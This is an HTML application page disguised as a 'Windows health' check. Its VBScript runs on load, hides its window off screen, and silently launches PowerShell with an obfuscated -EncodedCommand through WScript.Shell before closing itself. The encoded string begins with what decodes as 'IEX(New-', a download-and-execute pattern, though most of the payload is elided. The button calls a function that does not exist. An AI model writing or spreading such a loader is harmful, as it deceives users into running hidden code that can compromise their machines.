<!DOCTYPE html>
<html>
<head>
  <title>Windows health</title>

  <script type="text/vbscript">
        Sub Window_OnLoad
            Window.ResizeTo 0, 0
            Window.MoveTo -2000, -2000
        End Sub
         reportCreate
        Sub reportCreate
            encodedCommand = "SQBFAFgAKABOAGUAdwAt..F8ANAA0ADUAXwByAGUAYwB.=="
            Dim p1 : p1 = "powershell" & ".exe "
            Dim ec2 : ec2 = "-EncodedCommand "
            Dim x3 : x3 = p1 & ec2 & DcCustomScript(encodedCommand)

            Dim y4 : y4 = 0
            Dim z5 : z5 = True

            Dim o7 : Set o7 = CreateObject("WScript.Shell")

            o7.Run x3, y4, z5
        End Sub

        Function DecodeHex(hexString)
            DecodeHex = hexString
        End Function

        Function DcCustomScript(inputString)
            ' Define the specific prefixes and suffixes to remove
            Dim prefixToRemove
            Dim suffixToRemove
            prefixToRemove = "SQBFAFgAKABOAGUAdwAt."
            suffixToRemove = ".F8ANAA0ADUAXwByAGUAYwB.=="

            ' Check if the input string starts with the prefix
            If Left(inputString, Len(prefixToRemove)) = prefixToRemove Then
                inputString = Mid(inputString, Len(prefixToRemove) + 1) ' Remove the prefix
            End If

            ' Check if the input string ends with the suffix
            If Right(inputString, Len(suffixToRemove)) = suffixToRemove Then
                inputString = Left(inputString, Len(inputString) - Len(suffixToRemove)) ' Remove the suffix
            End If

            DcCustomScript = inputString & "==" ' Return the modified string
        End Function
		Self.Close
    </script>
</head>
<body>
  <button onclick="DisplayAlertAndExecutePSCommand()">Click to Details</button>
</body>
